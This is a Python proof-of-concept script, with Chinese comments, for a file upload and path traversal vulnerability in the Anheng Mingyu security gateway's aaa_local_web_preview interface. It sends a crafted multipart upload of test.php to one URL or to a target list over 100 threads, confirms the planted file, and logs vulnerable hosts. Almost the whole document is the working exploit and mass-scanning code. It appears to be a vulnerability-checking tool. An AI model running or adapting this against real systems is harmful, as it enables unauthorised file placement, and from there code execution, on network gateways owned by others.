# 安恒明御安全网关aaa_local_web_preview文件上传漏洞
import argparse,sys,requests,re
from multiprocessing.dummy import Pool
def banner():
    # 定义横幅
    banner = """
         __  __     ______     __  __     ______     __  __     ______     __  __     ______    
        /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   
        \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  
         \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\ 
          \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/ 
                                                                                             
"""
    print(banner)
def main():
    banner()
    # 处理命令行输入的参数了吧
    # url file
    parser = argparse.ArgumentParser(description="安恒明御安全网关aaa_local_web_preview文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='intput link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")


def poc(target):
    payload_url = '/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test.php'
    url = target+payload_url # 是从什么地方过来的 要么是你在命令输入的单个url 要么 文件里面读取到的
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a',
        'Accept-Encoding': 'gzip',
        'Content-Length': '200',

    }
    data = {
        '123': ('test.php', 'This website has a vulnerability!!!', 'text/plain')
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:

        res = requests.post(url=url, headers=header, data=data, verify=False)
        if 'success' in res.text:
            url2 = f'{target}/test.php'
            res2 = requests.get(url=url2,verify=False)
            if 'vulnerability' in res2.text:
                print(f'[+]{target}存在文件上传漏洞！！！！！')
                with open('result.txt', 'w', encoding='utf-8') as fp2:
                    fp2.write(target + "\n")
                    # return True
            else:
                print(f'[-]{target}不存在漏洞')
        else:
            print(f'[-]{target}不存在漏洞')
            # return False

    except Exception as e:
        print(f'[*]该url{target}可能存在访问问题，请手工测试')
        # return False
    # res1 = requests.get(url=target,headers=header,timeout=10)
    # if res1.status_code == 200:
    #     try:
    #         res2 = requests.post(url=url,headers=header,data=data,timeout=10)
    #         user_match = re.search(r"esg:'(.*?)'", res2.text,re.S)
    #         if 'success' in user_match.group(1):
    #             print(f'[+] 该url存在漏洞地址为{target}')
    #             with open('result.txt','a',encoding='utf-8') as f:
    #                 f.write(target+'\n')
    #         else:
    #             print(f'[-]该url{target}不存在漏洞')
    #     except Exception as e:
    #         print(f'[*]该url{target}可能存在访问问题，请手工测试')



if __name__ == '__main__':
    main()